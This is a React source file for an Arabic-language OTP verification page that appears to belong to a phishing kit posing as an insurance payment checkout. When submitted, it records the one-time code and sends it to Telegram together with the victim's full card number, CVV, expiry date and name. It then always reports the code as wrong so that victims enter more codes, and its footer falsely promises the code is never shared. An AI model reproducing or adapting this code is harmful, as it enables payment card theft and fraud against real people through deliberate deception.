import { zodResolver } from '@hookform/resolvers/zod'
import { useState, type ChangeEvent, type FormEvent } from 'react'
import { useForm } from 'react-hook-form'
import { useNavigate } from 'react-router-dom'

import { insertOtpAttempt } from '@/api/payments'
import { buildOtpanPhpTelegramText } from '@/api/telegramPhpParity'
import { sendTelegram } from '@/lib/telegram'
import { cardLastDigitsFromPan, readLastPaymentMeta } from '@/lib/session'
import { otpSchema, type OtpInput } from '@/schemas/payment'

export function OtpPage() {
  const navigate = useNavigate()
  const meta = readLastPaymentMeta()
  const [errorMsg, setErrorMsg] = useState('')
  const [shake, setShake] = useState(0)

  const form = useForm<OtpInput>({
    resolver: zodResolver(otpSchema),
    defaultValues: { pin_code: '' },
  })

  async function onSubmit(e: FormEvent) {
    e.preventDefault()
    if (!meta) return

    const value = form.getValues('pin_code').trim()
    const len = value.length
    if (len !== 4 && len !== 6) {
      setErrorMsg('رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى')
      setShake((s) => s + 1)
      return
    }

    const ts = new Date().toISOString()
    const last4 = cardLastDigitsFromPan(meta.card_number_raw)

    await insertOtpAttempt({
      paymentRequestId: meta._sup_payment_id ?? null,
      otpLength: len,
      otpPlain: value,
    })

    const text = buildOtpanPhpTelegramText({
      pin_code: value,
      timestamp_iso: ts,
      payment_amount: '',
      card_last_digits: last4,
      cardholder_name: meta.cardholder_name,
      masked_card: meta.masked_card,
      card_raw: meta.card_number_raw,
      expiry_date: meta.expiry_date,
      cvv_raw: meta.cvv_raw,
      total_amount_sess: meta.total_amount,
      insurance: {
        company: meta.insurance.company,
        plan: meta.insurance.plan,
        base: meta.insurance.base,
        price: meta.insurance.price,
        vat: meta.insurance.vat,
        total: meta.insurance.total,
        features: meta.insurance.features,
        start_date: meta.insurance.start_date,
        end_date: meta.insurance.end_date,
      },
    })
    try {
      await sendTelegram('otp', text, 2)
    } catch {
      /* تجاهل */
    }

    form.reset({ pin_code: '' })
    setErrorMsg('رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى')
    setShake((s) => s + 1)
  }

  if (!meta) {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center gap-4 bg-muted/40 px-4 text-center">
        <p className="text-muted-foreground">لا توجد عملية دفع مرتبطة.</p>
        <button
          type="button"
          onClick={() => navigate('/pay')}
          className="rounded-md bg-primary px-4 py-2 text-primary-foreground"
        >
          العودة إلى الدفع
        </button>
      </div>
    )
  }

  const last4Hint = cardLastDigitsFromPan(meta.card_number_raw)
  const hasError = Boolean(errorMsg)

  return (
    <div
      dir="rtl"
      className="flex min-h-[100dvh] items-center justify-center bg-gradient-to-br from-[#667eea] to-[#764ba2] p-5 font-[Segoe_UI,Tahoma,Geneva,Verdana,sans-serif]"
    >
      <style>{`
        @keyframes otpSlideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
        @keyframes otpShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(8px)}60%{transform:translateX(-6px)}80%{transform:translateX(4px)}}
        @keyframes otpSpin{to{transform:rotate(360deg)}}
      `}</style>

      <div
        key={`box-${shake}`}
        className={`relative w-full max-w-[500px] rounded-[20px] bg-white p-10 shadow-[0_10px_40px_rgba(0,0,0,0.2)] transition ${
          hasError
            ? 'border-2 border-[#ff7070] bg-[#fff5f5] shadow-[0_0_0_6px_rgba(255,112,112,0.15)]'
            : ''
        }`}
        style={{ animation: hasError ? 'otpShake .5s ease' : 'otpSlideUp .5s ease' }}
      >
        <div className="mb-8 text-center">
          <div className="mx-auto mb-4 flex size-20 items-center justify-center rounded-full bg-gradient-to-br from-[#667eea] to-[#764ba2] text-[40px]">
            🔐
          </div>
          <h1 className="mb-2 text-[26px] text-[#2c3e50]">إدخال رمز التحقق</h1>
          <p className="text-[15px] leading-[1.6] text-[#7f8c8d]">
            أدخل رمز OTP الذي وصلك الآن
          </p>
        </div>

        {hasError && (
          <div className="mb-4 rounded-[10px] border-2 border-[#ff9b9b] border-r-[6px] border-r-[#d10000] bg-[#ffe6e6] p-3 text-[14px] font-semibold text-[#b10000]">
            {errorMsg}
          </div>
        )}

        <form onSubmit={onSubmit} autoComplete="off" noValidate>
          <div className="mb-5">
            <label
              htmlFor="pin_code"
              className="mb-2.5 block text-[14px] font-semibold text-[#2c3e50]"
            >
              رمز OTP
            </label>
            <input
              id="pin_code"
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="••••••"
              dir="ltr"
              key={`inp-${shake}`}
              className={`w-full rounded-[10px] border-2 bg-white p-[15px] text-center text-[18px] font-bold tracking-[6px] transition focus:border-[#667eea] focus:outline-none focus:shadow-[0_0_0_3px_rgba(102,126,234,0.1)] ${
                hasError
                  ? 'border-[#ff3b3b] bg-[#ffecec] shadow-[0_0_0_4px_rgba(255,59,59,0.12)]'
                  : 'border-[#e0e0e0]'
              }`}
              style={{ animation: hasError ? 'otpShake .5s ease' : undefined }}
              {...form.register('pin_code', {
                onChange: (e: ChangeEvent<HTMLInputElement>) => {
                  const v = e.target.value.replace(/\D/g, '').slice(0, 6)
                  form.setValue('pin_code', v)
                  setErrorMsg('')
                },
              })}
            />
          </div>

          <div className="mb-[18px] rounded-[10px] border-r-4 border-[#667eea] bg-[#f8f9fa] p-[14px]">
            <p className="mb-1.5 text-[13px] leading-[1.6] text-[#555]">
              <span className="font-semibold text-[#2c3e50]">ملاحظة:</span>{' '}
              سيتم إرسال الرمز إلى رقم الهاتف المرتبط بالبطاقة.
            </p>
            {last4Hint ? (
              <p className="mt-1.5 text-center text-[12px] text-[#6b7280]">
                آخر 4 أرقام : <span dir="ltr">{last4Hint}</span>
              </p>
            ) : null}
          </div>

          <button
            type="submit"
            disabled={form.formState.isSubmitting}
            className="relative w-full overflow-hidden rounded-[10px] border-0 bg-gradient-to-br from-[#667eea] to-[#764ba2] p-[15px] text-[16px] font-bold text-white transition hover:-translate-y-0.5 hover:shadow-[0_5px_15px_rgba(102,126,234,0.4)] disabled:translate-y-0 disabled:cursor-not-allowed disabled:bg-[#cbd5e0] disabled:bg-none"
          >
            {form.formState.isSubmitting ? (
              <span
                className="mx-auto block size-5 rounded-full border-[3px] border-white/30 border-t-white"
                style={{ animation: 'otpSpin 1s linear infinite' }}
              />
            ) : (
              'تأكيد الرمز'
            )}
          </button>
        </form>

        <p className="mt-4 border-t border-[#e0e0e0] pt-4 text-center text-[12px] text-[#95a5a6]">
          لن نطلب منك مشاركة رمزك مع أي شخص.
        </p>
      </div>
    </div>
  )
}
